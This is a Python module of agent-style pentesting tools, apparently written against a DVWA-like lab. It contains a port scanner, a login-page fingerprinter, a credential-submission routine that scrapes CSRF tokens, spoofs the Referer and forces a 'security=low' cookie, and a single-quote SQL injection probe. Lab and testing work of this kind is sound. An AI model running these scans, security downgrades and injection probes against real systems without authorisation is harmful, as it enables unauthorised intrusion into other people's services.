import urllib.request
import urllib.parse
import http.cookiejar
import re
import socket

# ==========================================
# 【工业级核心配置】：常驻内存的全局安全上下文
# ==========================================
cookie_jar = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cookie_jar))
urllib.request.install_opener(opener)


def scan_target_ports(target_host):
    """【工具一】系统级端口边界扫描器。"""
    ports_to_scan = [80, 443, 3306, 8080, 11434]
    open_ports = []
    
    for port in ports_to_scan:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.5)
        result = s.connect_ex((target_host, port))
        if result == 0:
            open_ports.append(port)
        s.close()
    
    return f"扫描完成！目标主机开放了以下端口: {open_ports}" if open_ports else "扫描完成！所扫描的端口均未开放。"


def check_target_web(target_url):
    """【工具二】高级 Web 资产指纹探测工具。"""
    try:
        if not target_url.startswith("http://") and not target_url.startswith("https://"):
            target_url = "http://" + target_url
            
        req = urllib.request.Request(target_url, headers={'User-Agent': 'CyberAgent/Final'})
        with urllib.request.urlopen(req, timeout=5) as response:
            html_content = response.read().decode('utf-8', errors='ignore')
            
            title_match = re.search(r'<title>(.*?)</title>', html_content, re.IGNORECASE)
            page_title = title_match.group(1).strip() if title_match else "未找到标题"
            
            if "login" in html_content.lower() and ("password" in html_content.lower() or "username" in html_content.lower()):
                return f"探测成功！状态码: 200, 标题: [{page_title}]。警告：该页面检测到登录表单，后续敏感路径可能需要先执行 login 认证。"
                
            return f"探测成功！状态码: 200, 标题: [{page_title}]"
    except Exception as e:
        return f"探测失败！原因: {str(e)}"


def login_target_web(login_url, username, password):
    """
    【工具三】自动化表单凭证提交、CSRF 动态破墙与来源伪装工具。
    """
    print(f"[工具提示] 正在破解登录防线并初始化安全等级: {login_url} ...")
    try:
        # 1. 抓取 CSRF Token
        get_req = urllib.request.Request(login_url, headers={'User-Agent': 'CyberAgent/Final'})
        with urllib.request.urlopen(get_req, timeout=5) as response:
            get_html = response.read().decode('utf-8', errors='ignore')
        
        token_match = re.search(r"name=['\"]user_token['\"].*?value=['\"](.*?)['\"]", get_html, re.IGNORECASE)
        if not token_match:
            token_match = re.search(r"value=['\"](.*?)['\"].*?name=['\"]user_token['\"]", get_html, re.IGNORECASE)
            
        user_token = token_match.group(1).strip() if token_match else None
        
        if user_token:
            print(f"⚙️ [系统内网穿透]: 成功捕获当前会话的防御凭证 (CSRF Token): [{user_token}]")

        # 2. 组装 POST 表单
        form_data = {
            'username': username,
            'password': password,
            'Login': 'Login'
        }
        if user_token:
            form_data['user_token'] = user_token

        encoded_data = urllib.parse.urlencode(form_data).encode('utf-8')
        
        # 焊死 Referer 来源页，彻底粉碎反爬虫校验
        post_req = urllib.request.Request(
            login_url,
            data=encoded_data,
            headers={
                'User-Agent': 'CyberAgent/Final',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Referer': login_url
            },
            method='POST'
        )
        
        with urllib.request.urlopen(post_req, timeout=5) as response:
            html = response.read().decode('utf-8', errors='ignore')
            
            if "login failed" in html.lower() or "username" in html.lower() and "password" in html.lower() and "login" in response.geturl():
                return "认证失败：凭证错误或被鉴权系统无情拒绝。"
            
            # 顺手将系统的安全级别初始化为最低，以便展开后续刺探
            low_security_cookie = http.cookiejar.Cookie(
                version=0, name='security', value='low',
                port=None, port_specified=False,
                domain='localhost.local', domain_specified=True, domain_initial_dot=False,
                path='/', path_specified=True,
                secure=False, expires=None, discard=True, comment=None, comment_url=None, rest={}, rfc2109=False
            )
            cookie_jar.set_cookie(low_security_cookie)
                
            cookies_found = [f"{c.name}={c.value} ({c.domain})" for c in cookie_jar]
            return f"【身份穿透与安全降级全线成功】！全局会话已成功固化绑定: {cookies_found}"
            
    except Exception as e:
        return f"认证异常中断，原因: {str(e)}"


def check_sql_injection(target_url):
    """【工具四】手工强行注入 Cookie 请求头，粉碎原生 CookieJar 的域名锁定错位缺陷。"""
    print(f"[工具提示] 正在执行受保护路径的 SQL 注入测试: {target_url} ...")
    
    db_errors = [
        "you have an error in your sql syntax",
        "warning: mysql_fetch_array",
        "unclosed quotation mark after the character string"
    ]
    
    if "?" in target_url:
        payload_url = target_url + "'"
    else:
        payload_url = target_url.rstrip('/') + "/?id=1%27&Submit=Submit"

    try:
        # 1. 从合法的全局罐子里提取刚拿到的 SessionID
        current_session = ""
        for cookie in cookie_jar:
            if cookie.name == 'PHPSESSID':
                current_session = cookie.value
                break
        
        # 2. 建立独立的手工高级请求头（URL 依然维持原生的 localhost，确保网络 100% 畅通）
        req = urllib.request.Request(payload_url)
        req.add_header('User-Agent', 'CyberAgent/Final')
        
        # 3. 核心大招：手工拼装 Cookie，强行把会话和 low 等级灌进 Headers
        if current_session:
            req.add_header('Cookie', f"PHPSESSID={current_session}; security=low")
        else:
            req.add_header('Cookie', "security=low")

        with urllib.request.urlopen(req, timeout=5) as response:
            html = response.read().decode('utf-8', errors='ignore').lower()
            
            if "login.php" in response.geturl():
                return "【高危警告】: 漏洞测试被鉴权系统拦截！页面重定向至登录页。请检查是否已提前执行 login_target_web 认证。"
                
            for error in db_errors:
                if error in html:
                    return f"🔥【重磅高危漏洞预警】！成功穿透鉴权墙，在 low 安全等级路径触发 SQL 注入！数据库报错特征: [{error}]"
            
            return "测试完成：成功访问受保护页面，但直接注入单引号未引发标准的数据库报错。"
            
    except Exception as e:
        return f"漏洞测试中断：服务器响应异常，原始错误: {str(e)}"